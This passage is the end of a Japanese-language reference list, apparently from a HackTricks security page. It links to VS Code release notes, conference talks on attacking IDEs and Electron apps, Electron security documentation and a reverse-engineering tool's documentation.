- [18] [VS Code 1.89 / ローカルworkspace拡張機能](https://code.visualstudio.com/updates/v1_89#_local-workspace-extensions)
- [19] [APPSEC Cali 2018 - MarkDoom: 2週間で主要なIDEをすべてハッキングした方法](https://www.youtube.com/watch?v=a-YnG3Mx-Tg)
- [20] [ElectroVolt: Electronの新たな攻撃対象領域を発見しながら人気デスクトップアプリを攻略](https://www.youtube.com/watch?v=Tzo8ucHA5xw&list=PLH15HpR5qRsVKcKwvIl-AzGfRqKyx--zq&index=81)
- [21] [Electronのセキュリティ](https://www.electronjs.org/docs/latest/tutorial/security)
- [22] [Electron BrowserWindow webPreferences](https://www.electronjs.org/docs/latest/api/browser-window#new-browserwindowoptions)
- [23] [REA: あらゆるものをリバースエンジニアリング](https://github.com/morluto/rea)
- [24] [REA JavaScriptアーティファクトの再構築](https://github.com/morluto/rea/blob/main/docs/javascript-artifact-reconstruction.md)
- [25] [REAのクロスレイヤーJavaScriptアプリケーションワークフロー](https://github.com/morluto/rea/blob/main/docs/javascript-application-workflows.md)
{{#include ../../banners/hacktricks-training.md}}
